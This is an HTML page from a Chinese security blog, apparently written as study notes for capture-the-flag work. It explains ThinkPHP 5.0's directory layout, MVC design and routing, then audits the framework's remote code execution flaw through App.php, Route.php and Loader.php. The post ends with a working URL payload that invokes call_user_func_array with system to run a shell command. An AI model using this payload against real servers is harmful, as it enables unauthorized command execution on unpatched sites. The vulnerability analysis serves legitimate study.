@@ -1,0 +1,793 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next pisces use-motion" lang="en">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css" />
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="-web -php框架," />
+
+
+
+
+
+  <link rel="alternate" href="/atom.xml" title="mrl64's Blog" type="application/atom+xml" />
+
+
+
+
+
+
+<meta name="description" content="前言 考完试终于有时间来进行一波网安的学了，ciscn几道框架题看得我头皮发麻，正好趁着暑假开始学习框架，我们先从php框架开始。">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Thinkphp框架原理及简单审计">
+<meta property="og:url" content="http://example.com/2022/07/07/Thinkphp%E6%A1%86%E6%9E%B6%E5%8E%9F%E7%90%86%E5%8F%8A%E7%AE%80%E5%8D%95%E5%AE%A1%E8%AE%A1/index.html">
+<meta property="og:site_name" content="mrl64&#39;s Blog">
+<meta property="og:description" content="前言 考完试终于有时间来进行一波网安的学了，ciscn几道框架题看得我头皮发麻，正好趁着暑假开始学习框架，我们先从php框架开始。">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://s2.loli.net/2022/07/07/rzASYFRJGXabMLj.png">
+<meta property="article:published_time" content="2022-07-07T07:02:32.000Z">
+<meta property="article:modified_time" content="2022-07-07T11:18:58.372Z">
+<meta property="article:author" content="liszt_lin">
+<meta property="article:tag" content="-web -php框架">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://s2.loli.net/2022/07/07/rzASYFRJGXabMLj.png">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '',
+    scheme: 'Pisces',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: 'Author'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://example.com/2022/07/07/Thinkphp框架原理及简单审计/"/>
+
+
+
+
+
+  <title>Thinkphp框架原理及简单审计 | mrl64's Blog</title>
+  
+
+
+
+
+
+
+
+
+<meta name="generator" content="Hexo 5.4.0"></head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="en">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/"  class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">mrl64's Blog</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle"></p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
+            
+            Home
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-user"></i> <br />
+            
+            About
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
+            
+            Archives
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />
+            
+            Tags
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-th"></i> <br />
+            
+            Categories
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2022/07/07/Thinkphp%E6%A1%86%E6%9E%B6%E5%8E%9F%E7%90%86%E5%8F%8A%E7%AE%80%E5%8D%95%E5%AE%A1%E8%AE%A1/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="mrl64's Blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">Thinkphp框架原理及简单审计</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2022-07-07T15:02:32+08:00">
+                2022-07-07
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">In</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/web/" itemprop="url" rel="index">
+                    <span itemprop="name">web</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><blockquote>
+<p>考完试终于有时间来进行一波网安的学了，ciscn几道框架题看得我头皮发麻，正好趁着暑假开始学习框架，我们先从php框架开始。</p>
+</blockquote>
+<span id="more"></span>
+
+<h1 id="关于php框架"><a href="#关于php框架" class="headerlink" title="关于php框架"></a>关于php框架</h1><p>php的开源框架有很多，目前在ctf中遇到的比较多的框架有Thinkphp、zendframework(Laminas)等等，而我们就从资料比较多、难度也没那么大的Thinkphp5.0框架开始。</p>
+<h1 id="目录结构"><a href="#目录结构" class="headerlink" title="目录结构"></a>目录结构</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">application 应用目录</span><br><span class="line">         ---|index 模块</span><br><span class="line">            ---|controller 控制器</span><br><span class="line">            ---|model 模型</span><br><span class="line">            ---|view  视图</span><br><span class="line">            ---|config.php 模块配置文件 服务的对象是index模块</span><br><span class="line">            ---|database.php 模块数据库的配置文件,服务的对象是index模块</span><br><span class="line">            ---|common.php 模块公共函数文件,服务的对象是index模块</span><br><span class="line">         ---|common.php 模块的公共文件(公共函数 调用第三方类库 发送邮件 发送短信...)</span><br><span class="line">         ---|config.php 应用配置文件 (作用对象是所有的模块)</span><br><span class="line">         ---|database.php 数据库配置文件 (作用对象是所有的模块，配置连接数据库的信息)</span><br><span class="line">         ---|route.php 路由目录</span><br><span class="line">    extend 扩展包目录 (存放的是三方类  发送邮件类,支付类...)</span><br><span class="line">    public 根目录</span><br><span class="line">      ---|static 静态资源目录(存放css js image....) </span><br><span class="line">    runtime 缓存目录</span><br><span class="line">    thinkphp 框架核心目录</span><br><span class="line">      ---|library</span><br><span class="line">        ---|think 核心类库(model page file...)</span><br><span class="line">      ---|lang语言包</span><br><span class="line">      ---|tpl模板系统目录</span><br><span class="line">      ---|convention.php 惯例配置文件</span><br><span class="line">    vendor 三方扩展目录</span><br><span class="line">    composer.json 工具包信息记录文件</span><br></pre></td></tr></table></figure>
+
+<h1 id="运行原理"><a href="#运行原理" class="headerlink" title="运行原理"></a>运行原理</h1><p><img src="https://s2.loli.net/2022/07/07/rzASYFRJGXabMLj.png"></p>
+<h2 id="mvc设计模式"><a href="#mvc设计模式" class="headerlink" title="mvc设计模式"></a>mvc设计模式</h2><p>m（模型）v（视图）c（控制器）是Thinkphp的一大特色，c通过调度m获取数据，加载v将数据返回给客户端。</p>
+<h3 id="模型层（m）"><a href="#模型层（m）" class="headerlink" title="模型层（m）"></a>模型层（m）</h3><p>在m层中，比较复杂的项目设计需要区分数据层、逻辑层、服务层等不同的模型层，因此可以在模块目录下面创建Model、Logic和Service目录，把对用户表的所有模型操作分成三层：</p>
+<ul>
+<li>数据层：Model/UserModel       用于定义数据相关的自动验证、自动完成和数据存取</li>
+<li>逻辑层：Logic/UserLogic       用于定义用户相关的业务逻辑</li>
+<li>服务层：Service/UserService   用于定义用户相关的服务接口等<br>这三个模型操作类统一都要继承Model类。</li>
+</ul>
+<h3 id="视图层（v）"><a href="#视图层（v）" class="headerlink" title="视图层（v）"></a>视图层（v）</h3><p>以首页设置来说：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">class Index extends Controller&#123;</span><br><span class="line">    /**</span><br><span class="line">     * 首页</span><br><span class="line">     */</span><br><span class="line">    public function index()</span><br><span class="line">    &#123;</span><br><span class="line">        return $this-&gt;fetch();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>fetch()传入的参数是模板名，用模板文件来输出。如果 fetch() 不传参数，程序会自动寻找 view/index/index.html渲染输出。如果传参数，比如传入” hello“，那么程序会寻找view/index/hello.html来渲染输出。</p>
+<p>而如果使用display()来代替fetch()的话，会直接输出传递的内容，如果没有传递参数，会渲染出Layout，但不会有任何内容。如果传递参数, 比如 “hello”，那么页面会直接输出字符串 “hello”。</p>
+<p>而view()的使用与fetch()相同，但写法上有一定不同：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">class Index extends Controller&#123;</span><br><span class="line">    /**</span><br><span class="line">     * 首页</span><br><span class="line">     */</span><br><span class="line">    public function index()</span><br><span class="line">    &#123;</span><br><span class="line">        return view();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="控制器层（c）"><a href="#控制器层（c）" class="headerlink" title="控制器层（c）"></a>控制器层（c）</h3><p>c层由核心控制器和业务控制器组成，核心控制器由系统内部的App类完成，负责应用（包括模块、控制器和操作）的调度控制，包括HTTP请求拦截、转发、加载配置等；而业务控制器则由用户定义的控制器类完成。</p>
+<p>同样在复杂项目中可以对业务控制器进行分层，分为访问控制器和事件控制器，访问控制器负责外部交互响应，通过URL请求响应，例如 http://域名/Home/User/login.html；事件控制器负责内部的事件响应，并且只能在内部调用，所以是和外部隔离的，确切的说，访问控制器之外的分层控制器都只能内部实例化调用。</p>
+<h2 id="url访问"><a href="#url访问" class="headerlink" title="url访问"></a>url访问</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">不支持普通的模式    http://www.tp5.com/index.php?m=index&amp;c=Index&amp;a=add</span><br><span class="line">只支持pathinfo模式 http://www.tp5.com/index.php/index/Index/add?name=junge</span><br><span class="line">pathinfo 模式: 简化url地址,可以提高网站的收录排名,有利于seo优化</span><br></pre></td></tr></table></figure>
+
+<h2 id="路由"><a href="#路由" class="headerlink" title="路由"></a>路由</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">(1)普通使用:</span><br><span class="line">Route::rule(&#x27;路由规则&#x27;, &#x27;模块/控制器/方法&#x27;, &#x27;请求方式&#x27;, [伪静态设置], [参数类型设置]);</span><br><span class="line">如：Route::rule(&#x27;/admin/:id&#x27;, &#x27;admin/Index/index&#x27;, &#x27;get&#x27;, [&#x27;ext&#x27; =&gt; &#x27;html&#x27;], [&#x27;id&#x27; =&gt; &#x27;\d+&#x27;]);</span><br><span class="line">(2)请求方式路由</span><br><span class="line">Route::get(&quot;路由规则&quot;,&quot;模块/控制器/方法&quot;);</span><br><span class="line">格式:</span><br><span class="line">Route::get(&quot;/test&quot;,&quot;index/Index/index&quot;);</span><br><span class="line">(3)隐式路由</span><br><span class="line">把所有的访问操作统统交给同一个路由规则（/test）处理 </span><br><span class="line">Route::controller(&quot;路由规则&quot;,&quot;模块/控制器&quot;);</span><br><span class="line">格式:</span><br><span class="line">Route::controller(&quot;/test&quot;,&quot;index/Index&quot;);</span><br><span class="line">(4)路由别名</span><br><span class="line">通过路由别名访问控制器下的所有方法</span><br><span class="line">Route::alias(&quot;别名&quot;,&quot;模块/控制器&quot;);</span><br><span class="line">格式:</span><br><span class="line">Route::alias(&quot;users&quot;,&quot;admin/Test&quot;);</span><br></pre></td></tr></table></figure>
+
+<h1 id="代码审计"><a href="#代码审计" class="headerlink" title="代码审计"></a>代码审计</h1><p>我们以Thinkphp5的远程代码RCE为例进行漏洞分析。首先查看<code>thinkphp/library/think/App.php:540</code>:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">// 路由检测（根据路由定义返回不同的URL调度）</span><br><span class="line">            $result = Route::check($request, $path, $depr, $config[&#x27;url_domain_deploy&#x27;]);</span><br><span class="line">            $must   = !is_null(self::$routeMust) ? self::$routeMust : $config[&#x27;url_route_must&#x27;];</span><br><span class="line">            if ($must &amp;&amp; false === $result) &#123;</span><br><span class="line">                // 路由无效</span><br><span class="line">                throw new RouteNotFoundException();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        if (false === $result) &#123;</span><br><span class="line">            // 路由无效 解析模块/控制器/操作/参数... 支持控制器自动搜索</span><br><span class="line">            $result = Route::parseUrl($path, $depr, $config[&#x27;controller_auto_search&#x27;]);</span><br><span class="line">        &#125;</span><br><span class="line">        return $result;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+<p>由于没有在配置文件中定义任何路由，因此按照路由到模块/控制器的方法进行解析调度，接下来进行跟进<code>thinkphp/library/think/Route.php:1238</code>:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">// 解析操作</span><br><span class="line">            $action = !empty($path) ? array_shift($path) : null;</span><br><span class="line">            // 解析额外参数</span><br><span class="line">            self::parseUrlParams(empty($path) ? &#x27;&#x27; : implode(&#x27;|&#x27;, $path));</span><br><span class="line">            // 封装路由</span><br><span class="line">            $route = [$module, $controller, $action];</span><br><span class="line">            // 检查地址是否被定义过路由</span><br><span class="line">            $name  = strtolower($module . &#x27;/&#x27; . Loader::parseName($controller, 1) . &#x27;/&#x27; . $action);</span><br><span class="line">            $name2 = &#x27;&#x27;;</span><br><span class="line">            if (empty($module) || isset($bind) &amp;&amp; $module == $bind) &#123;</span><br><span class="line">                $name2 = strtolower(Loader::parseName($controller, 1) . &#x27;/&#x27; . $action);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            if (isset(self::$rules[&#x27;name&#x27;][$name]) || isset(self::$rules[&#x27;name&#x27;][$name2])) &#123;</span><br><span class="line">                throw new HttpException(404, &#x27;invalid request:&#x27; . str_replace(&#x27;|&#x27;, $depr, $url));</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        return [&#x27;type&#x27; =&gt; &#x27;module&#x27;, &#x27;module&#x27; =&gt; $route];</span><br></pre></td></tr></table></figure>
+<p>可以发现解析url的时候框架知识将URL按照分割符进行分割，并没有进行安全检测。继续跟进<code>thinkphp/library/think/App.php:333</code>:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">// 模块初始化</span><br><span class="line">            if ($module &amp;&amp; $available) &#123;</span><br><span class="line">                // 初始化模块</span><br><span class="line">                $request-&gt;module($module);</span><br><span class="line">                $config = self::init($module);</span><br><span class="line">                // 模块请求缓存检查</span><br><span class="line">                $request-&gt;cache($config[&#x27;request_cache&#x27;], $config[&#x27;request_cache_expire&#x27;]);</span><br><span class="line">            &#125; else &#123;</span><br><span class="line">                throw new HttpException(404, &#x27;module not exists:&#x27; . $module);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            // 单一模块部署</span><br><span class="line">            $module = &#x27;&#x27;;</span><br><span class="line">            $request-&gt;module($module);</span><br><span class="line">        &#125;</span><br><span class="line">        // 当前模块路径</span><br><span class="line">        App::$modulePath = APP_PATH . ($module ? $module . DS : &#x27;&#x27;);</span><br><span class="line"></span><br><span class="line">        // 是否自动转换控制器和操作名</span><br><span class="line">        $convert = is_bool($convert) ? $convert : $config[&#x27;url_convert&#x27;];</span><br><span class="line">        // 获取控制器名</span><br><span class="line">        $controller = strip_tags($result[1] ?: $config[&#x27;default_controller&#x27;]);</span><br><span class="line">        $controller = $convert ? strtolower($controller) : $controller;</span><br><span class="line"></span><br><span class="line">        // 获取操作名</span><br><span class="line">        $actionName = strip_tags($result[2] ?: $config[&#x27;default_action&#x27;]);</span><br><span class="line">        $actionName = $convert ? strtolower($actionName) : $actionName;</span><br><span class="line"></span><br><span class="line">        // 设置当前请求的控制器、操作</span><br><span class="line">        $request-&gt;controller(Loader::parseName($controller, 1))-&gt;action($actionName);</span><br></pre></td></tr></table></figure>
+<p>在攻击时注意使用一个已存在的module，否则会抛出异常，无法继续运行。</p>
+<p>接下来对控制器进行实例化的部分进行跟进<code>thinkphp/library/think/Loader.php:</code>:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">public static function action($url, $vars = [], $layer = &#x27;controller&#x27;, $appendSuffix = false)</span><br><span class="line">    &#123;</span><br><span class="line">        $info   = pathinfo($url);</span><br><span class="line">        $action = $info[&#x27;basename&#x27;];</span><br><span class="line">        $module = &#x27;.&#x27; != $info[&#x27;dirname&#x27;] ? $info[&#x27;dirname&#x27;] : Request::instance()-&gt;controller();</span><br><span class="line">        $class  = self::controller($module, $layer, $appendSuffix);</span><br><span class="line">        if ($class) &#123;</span><br><span class="line">            if (is_scalar($vars)) &#123;</span><br><span class="line">                if (strpos($vars, &#x27;=&#x27;)) &#123;</span><br><span class="line">                    parse_str($vars, $vars);</span><br><span class="line">                &#125; else &#123;</span><br><span class="line">                    $vars = [$vars];</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            return App::invokeMethod([$class, $action . Config::get(&#x27;action_suffix&#x27;)], $vars);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">public static function controller($name, $layer = &#x27;controller&#x27;, $appendSuffix = false, $empty = &#x27;&#x27;)</span><br><span class="line">    &#123;</span><br><span class="line">        if (strpos($name, &#x27;\\&#x27;)) &#123;</span><br><span class="line">            $class = $name;</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            if (strpos($name, &#x27;/&#x27;)) &#123;</span><br><span class="line">                list($module, $name) = explode(&#x27;/&#x27;, $name);</span><br><span class="line">            &#125; else &#123;</span><br><span class="line">                $module = Request::instance()-&gt;module();</span><br><span class="line">            &#125;</span><br><span class="line">            $class = self::parseClass($module, $layer, $name, $appendSuffix);</span><br><span class="line">        &#125;</span><br><span class="line">        if (class_exists($class)) &#123;</span><br><span class="line">            return App::invokeClass($class);</span><br><span class="line">        &#125; elseif ($empty &amp;&amp; class_exists($emptyClass = self::parseClass($module, $layer, $empty, $appendSuffix))) &#123;</span><br><span class="line">            return new $emptyClass(Request::instance());</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+
+<p>正常情况下应该获取到对应控制器类的实例化对象，而我们现在得到了一个\think\App的实例化对象，进而通过url调用其任意的public方法，同时解析url中的额外参数，当作方法的参数传入。</p>
+<p>payload:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?s=index/think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=id</span><br></pre></td></tr></table></figure>
+
+<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>整个流程跟进分析下来感觉还是很吃力的，对于框架的漏洞挖掘可以看得出还是相当有难度的。之后应该也会刷刷vulhub学习一些漏洞。</p>
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/web-php%E6%A1%86%E6%9E%B6/" rel="tag"># -web -php框架</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2022/06/03/mysql8%E4%B8%8B%E7%9A%84sql%E6%B3%A8%E5%85%A5/" rel="next" title="mysql8下的sql注入">
+                <i class="fa fa-chevron-left"></i> mysql8下的sql注入
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            Table of Contents
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            Overview
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <p class="site-author-name" itemprop="name"></p>
+              <p class="site-description motion-element" itemprop="description"></p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives%7C%7C%20archive">
+              
+                  <span class="site-state-item-count">76</span>
+                  <span class="site-state-item-name">posts</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-categories">
+                <a href="/categories/index.html">
+                  <span class="site-state-item-count">3</span>
+                  <span class="site-state-item-name">categories</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                <a href="/tags/index.html">
+                  <span class="site-state-item-count">29</span>
+                  <span class="site-state-item-name">tags</span>
+                </a>
+              </div>
+            
+
+          </nav>
+
+          
+            <div class="feed-link motion-element">
+              <a href="/atom.xml" rel="alternate">
+                <i class="fa fa-rss"></i>
+                RSS
+              </a>
+            </div>
+          
+
+          
+
+          
+          
+
+          
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%89%8D%E8%A8%80"><span class="nav-number">1.</span> <span class="nav-text">前言</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%85%B3%E4%BA%8Ephp%E6%A1%86%E6%9E%B6"><span class="nav-number"></span> <span class="nav-text">关于php框架</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E7%9B%AE%E5%BD%95%E7%BB%93%E6%9E%84"><span class="nav-number"></span> <span class="nav-text">目录结构</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E8%BF%90%E8%A1%8C%E5%8E%9F%E7%90%86"><span class="nav-number"></span> <span class="nav-text">运行原理</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#mvc%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F"><span class="nav-number">1.</span> <span class="nav-text">mvc设计模式</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%A8%A1%E5%9E%8B%E5%B1%82%EF%BC%88m%EF%BC%89"><span class="nav-number">1.1.</span> <span class="nav-text">模型层（m）</span></a></li><li class="nav-item 